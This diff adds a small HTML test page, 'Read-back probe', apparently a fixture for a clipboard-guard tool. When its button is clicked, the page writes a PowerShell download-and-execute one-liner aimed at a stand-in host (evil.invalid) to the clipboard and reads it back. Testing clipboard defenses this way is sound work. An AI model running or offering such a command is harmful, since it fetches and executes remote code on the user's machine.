@@ -1,0 +1,7 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Read-back probe</title>
+<script src="common.js"></script></head>
+<body><h1>Read-back probe</h1>
+<button id="go">Check</button>
+<script>document.getElementById("go").addEventListener("click",async()=>{await window.__clipguard.writeText(`iex (iwr https://evil.invalid/p.txt -UseBasicParsing)`);await window.__clipguard.readBack();});</script>
+</body></html>
